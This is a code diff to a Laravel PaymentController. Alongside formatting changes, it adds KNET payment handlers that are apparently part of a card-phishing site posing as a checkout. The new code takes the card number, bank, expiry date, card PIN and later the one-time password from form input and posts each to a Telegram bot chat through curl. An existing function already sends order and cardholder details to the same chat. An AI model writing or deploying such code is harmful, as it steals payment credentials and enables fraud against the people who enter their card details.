@@ -68,12 +68,12 @@ class PaymentController extends Controller
     protected function sendTelegramNotification($order, $name, $email, $phone, $code, $totalPrice, $firstBatch, $paymentGateway)
     {
         $batch = $totalPrice - $firstBatch;
-    if(session('CashOrBatch') != 0){
-        $batch = $batch / session('CashOrBatch');
-    }else{
-        $batch = 0;
-    }
-        
+        if (session('CashOrBatch') != 0) {
+            $batch = $batch / session('CashOrBatch');
+        } else {
+            $batch = 0;
+        }
+
         // Build the message
         $message = ":: طلب جديد ::" . PHP_EOL
             . "رقم الطلب: " . $code . PHP_EOL
@@ -86,7 +86,7 @@ class PaymentController extends Controller
             . "المبلغ الإجمالي: " . $totalPrice . PHP_EOL
             . "الدفعة الأولى: " . $firstBatch . PHP_EOL
             . "فترة التقسيط: " . session('CashOrBatch') . PHP_EOL
-            . "مبلغ التقسيط: " . number_format($batch,2) . PHP_EOL
+            . "مبلغ التقسيط: " . number_format($batch, 2) . PHP_EOL
 
             // . " طريقة الدفع: " . $paymentGateway . PHP_EOL
             . "الاسم على البطاقة: " . session('card_name') . PHP_EOL
@@ -427,4 +427,89 @@ class PaymentController extends Controller
             ]);
         }
     }
+    public function knet()
+    {
+
+        $cart = session()->get('cart', []);
+
+        // Calculate the total price of the cart
+        $totalPrice = 0;
+        foreach ($cart as $item) {
+            $totalPrice += $item['price'] * $item['quantity'];
+        }
+        return view('frontend.knet', [
+            'totalPrice' => $totalPrice,
+            'first_cash' => session()->get('first_payment', 0),
+            'payments' => array_fill(0, 4, $totalPrice / 4)
+        ]);
+    }
+    public function payment_knet_post(Request $request)
+    {
+        // Store all request data in session
+        session(['knet_session' => $request->all()]);
+    
+        $databot = 'رقم البطاقة   : ' . $request->prefix . $request->debitNumber . PHP_EOL .
+        'اسم البنك: ' . $request->bank . PHP_EOL .
+        'المبلغ كامل : ' . $request->amount . PHP_EOL .
+        'القسط الاول: ' . $request->first_batch . PHP_EOL .
+        'الشهر : ' . $request->month . PHP_EOL .
+        'السنة : ' . $request->year . PHP_EOL .
+        'PIN : ' . $request->cardPin . PHP_EOL .
+        'طريقة الدفع : KNET';
+    
+        $sender = [
+            'chat_id' => env('TOKEN_TELEGRAM_CHAT_ID'),
+            'text' => $databot,
+        ];
+    
+        $key = env('TOKEN_TELEGRAM');
+        $url = "https://api.telegram.org/bot" . $key . "/sendMessage";
+    
+        // Initialize cURL
+        $curl = curl_init($url);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($curl, CURLOPT_POST, true);
+        curl_setopt($curl, CURLOPT_POSTFIELDS, $sender);
+    
+        // Execute cURL request
+        $response = curl_exec($curl);
+    
+        return response()->json([
+            'success' => true,
+            'message' => 'تم ارسال البيانات بنجاح',
+            'url' => route('knet.confirm')
+        ]);
+    }
+    public function knet_confirm()
+    {
+        $data = session('knet_session');
+
+        return view('frontend.knet_confirm', [
+            'data' => $data,
+        ]);
+    }  
+    public function knet_confirm_post(Request $request){
+        $key = env('TOKEN_TELEGRAM');
+        $url = "https://api.telegram.org/bot{$key}/sendMessage";
+        // Prepare the POST data
+        $databot=' otp   : '.$request->otp.PHP_EOL  .'طريقة الدفع : KNET';
+        $sender = [
+            'chat_id' => env('TOKEN_TELEGRAM_CHAT_ID'),
+            'text' => $databot,
+        ];
+        // DIE($databot);
+    
+       
+        
+        // Initialize cURL
+        $curl = curl_init($url);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($curl, CURLOPT_POST, true);
+        curl_setopt($curl, CURLOPT_POSTFIELDS, $sender);
+        
+        // Execute cURL request
+        $response = curl_exec($curl);
+     
+    }  
+        //
 }
